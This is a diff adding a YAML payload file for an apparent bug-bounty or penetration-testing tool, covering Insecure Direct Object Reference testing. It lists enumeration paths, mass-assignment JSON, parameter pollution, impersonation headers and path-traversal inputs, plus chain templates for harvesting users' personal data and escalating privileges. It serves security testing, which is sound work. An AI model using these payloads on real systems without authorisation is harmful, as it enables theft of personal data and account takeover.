@@ -1,0 +1,109 @@
+name: Insecure Direct Object Reference (IDOR)
+description: >
+  IDOR occurs when an application exposes direct references to internal
+  objects (files, database records) without proper authorization checks.
+
+basic_payloads:
+  - "/api/users/1"
+  - "/api/users/2"
+  - "/api/users/100"
+  - "/api/orders/1001"
+  - "/api/invoices/5000"
+  - "/user/profile?id=1"
+  - "/user/profile?id=2"
+  - "/documents/123"
+  - "/download/456"
+  - "/admin/users/1/edit"
+  - "/v2/accounts/12345/details"
+  - "/api/v1/users/me/orders?userId=1"
+  - "/api/partner/status?partnerId=100"
+
+bypass_techniques:
+  - name: Sequential ID Enumeration
+    description: Increment or decrement numeric IDs to access other users' data
+    payloads:
+      - "/api/users/1"
+      - "/api/users/2"
+      - "/api/users/100"
+      - "/api/users/1000"
+
+  - name: UUID Enumeration
+    description: Guess or discover other users' UUIDs from patterns
+    payloads:
+      - "/api/users/00000000-0000-0000-0000-000000000001"
+      - "/api/users/00000000-0000-0000-0000-000000000002"
+      - "Try predictable UUID v1 timestamps"
+
+  - name: Batch/Mass Assignment
+    description: Add or modify parameters in batch requests
+    payloads:
+      - '{"user_id": 2, "role": "admin"}'
+      - '{"id": 3, "is_admin": true}'
+      - '["user_id=2", "role=admin"]'
+
+  - name: Parameter Pollution
+    description: Send multiple parameters to bypass access controls
+    payloads:
+      - "/api/users?id=1&id=2"
+      - "/api/profile?user_id=1&user_id=admin"
+      - "POST /api/update?id=1&id=2"
+
+  - name: Header-Based Authorization Bypass
+    description: Manipulate headers to impersonate other users
+    payloads:
+      - "X-User-Id: 2"
+      - "X-Forwarded-User: admin"
+      - "X-On-Behalf-Of: admin@example.com"
+      - "Impersonate-User: 2"
+
+  - name: Path Traversal IDOR
+    description: Use path traversal in object references
+    payloads:
+      - "/api/users/../admin/profile"
+      - "/documents/./user/2/file.pdf"
+      - "/api/.../users/admin/profile"
+
+  - name: JSON Injection
+    description: Inject additional parameters in JSON payloads
+    payloads:
+      - '{"user_id": 2, "role": "admin", "is_admin": true}'
+      - '{"id": 1, "admin": true, "permissions": ["*"]}'
+
+detection_patterns:
+  - "idor"
+  - "insecure direct object reference"
+  - "broken access control"
+  - "authorization"
+  - "forbidden"
+  - "unauthorized"
+  - "permission"
+  - "access control"
+  - "user id"
+  - "order id"
+
+chain_templates:
+  - name: IDOR -> PII Data Breach
+    description: Chain sequential ID enumeration to exfiltrate PII of multiple users
+    requirements: [idor, pii_in_response]
+    steps:
+      - Confirm IDOR by accessing another user's resource
+      - Automate sequential enumeration
+      - Collect PII from each response
+      - Report with evidence of mass data exposure
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: IDOR -> Privilege Escalation
+    description: Use IDOR to modify another user's role or permissions
+    requirements: [idor, write_access, role_parameter]
+    steps:
+      - Find object reference in update operation
+      - Modify the reference to point to admin user
+      - Change role/permission parameters
+      - Verify escalated access
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "IDOR in user profile API"
+    technique: "Sequential ID enumeration"
+    severity: "high"
